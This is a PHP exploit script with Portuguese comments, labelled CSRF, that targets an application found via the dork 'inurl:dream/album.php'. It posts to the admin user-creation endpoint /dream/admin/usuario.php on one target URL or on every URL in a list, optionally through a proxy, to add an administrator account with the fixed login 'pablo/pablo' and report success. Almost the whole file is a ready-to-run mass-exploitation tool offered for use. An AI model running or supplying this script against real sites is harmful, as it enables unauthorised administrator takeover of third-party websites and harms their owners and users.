<?php
	
	# Exploit Título: CSRF - Cross-Site Request Forgery
	# Google Dork: inurl:dream/album.php
	# Software Link: https://github.com/PabloSanthus/-PHP-Exploit-CSRF
	# Data: 16/12/2016
	# Exploit Autor: Pablo Santhus
	# Versão: 1.0
	# Testado em: [Kali Linux 2.0 | Windows 7]


	error_reporting(0);
	set_time_limit(0);

	function banner(){
		echo "
   ___          _____                      _ _         
  / _ \        / ____|                    (_) |        
 | | | |_  __ | (___   ___  ___ _   _ _ __ _| |_ _   _ 
 | | | \ \/ /  \___ \ / _ \/ __| | | | '__| | __| | | |
 | |_| |>  <   ____) |  __/ (__| |_| | |  | | |_| |_| |
  \___//_/\_\ |_____/ \___|\___|\__,_|_|  |_|\__|\__, |
                                                  __/ | 0.1
                                                 |___/ 
	[+] Autor: Pablo Santhus
	[+] Nome: 0xsec_dork
	[+] Facebook: /pablosanthus
	[+] Twitter: @pablo_santhus
	[+] Youtube: /0xsec
	[+] Github: /pablosanthus
	[+] Ajuda: CSRF.php -h
		\n\n";
	}

	function bannerhelp(){
		echo "
   ___          _____                      _ _         
  / _ \        / ____|                    (_) |        
 | | | |_  __ | (___   ___  ___ _   _ _ __ _| |_ _   _ 
 | | | \ \/ /  \___ \ / _ \/ __| | | | '__| | __| | | |
 | |_| |>  <   ____) |  __/ (__| |_| | |  | | |_| |_| |
  \___//_/\_\ |_____/ \___|\___|\__,_|_|  |_|\__|\__, |
                                                  __/ | 0.1
                                                 |___/ 
	[+] Autor: Pablo Santhus
	[+] Nome: 0xsec_dork
	[+] Facebook: /pablosanthus
	[+] Twitter: @pablo_santhus
	[+] Youtube: /0xsec
	[+] Github: /pablosanthus
	[+] Menu de Ajuda
		\n\n";
	}

	if(isset($argv[2]) && $argv[1] == "-u"){
		banner();
		if($argv[3] == "-proxy"){
			$proxys = $argv[4];
			$proxy = explode(":", $proxys);
			$oks = fsockopen($proxy[0], $proxy[1]);
			if(!$oks){
				echo "[-] O proxy nao responde {$proxy[0]}:{$proxy[1]}";
				exit;
			}
		}

		$url = $argv[2];
		$adduser = "/dream/admin/usuario.php?action=incluir";

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url.$adduser);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
		curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "user_login=pablo&user_password=pablo&Add-Admin");
		curl_setopt($ch, CURLOPT_USERAGENT, "");
		$exec = curl_exec($ch);
		if(strstr($exec, "Login")){
			print "********************Exploited********************\n\n";
			print "Usuario: pablo | Senha: pablo \n";
			print "{$url}/dream/admin/login.php\n\n";
			print "********************Exploited********************\n";
		}else{
			echo "Not Exploited :(";
		}

	}

	if(isset($argv[2]) && $argv[1] == "-url"){
		banner();
		if($argv[3] == "-proxy"){
			$proxys = $argv[4];
			$proxy = explode(":", $proxys);
			$oks = fsockopen($proxy[0], $proxy[1]);
			if(!$oks){
				echo "[-] O proxy nao responde {$proxy[0]}:{$proxy[1]}";
				exit;
			}
		}

		$urls = $argv[2];
		$url = file($urls);

		foreach($url as $web){
			$web = str_replace("\r", "", $web);
			$web = str_replace("\n", "", $web);

			$adduser = "/dream/admin/usuario.php?action=incluir";

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $web.$adduser);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_PROXY, $proxy[0]);
			curl_setopt($ch, CURLOPT_PROXYPORT, $proxy[1]);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, "user_login=pablo&user_password=pablo&Add-Admin");
			curl_setopt($ch, CURLOPT_USERAGENT, "");
			$exec = curl_exec($ch);
			if(strstr($exec, "Login")){
				print "******************Exploited******************\n\n";
				print "[+] Usuario: pablo | Senha: pablo\n";
				print "[+] {$web}/dream/admin/login.php\n\n";
				print "******************Exploited******************\n\n";
			}else{
				print "OPS Not Exploited :(";
			}
		}
	}

	if($argv[1] == "-h" or $argv[1] == "-help" or $argv[1] == ""){
		bannerhelp();
		echo "
	OPTIONS[-u, -url, -proxy, -h]

	-u       Adiciona uma url para exploracao

	-url     Adiciona um lista de urls ex:(sites.txt)

	-proxy   Adiciona uma proxy(127.0.0.1:80)
	
	-h       Exibe um pequeno menu de ajuda

	Exemplo:

	php CSRF.php -u http://sitevuln.com/ 
	php CSRF.php -url sites.txt
	php CSRF.php -u http://sitevuln.com/ -proxy 127.0.0.1:80

		";
	}


?>
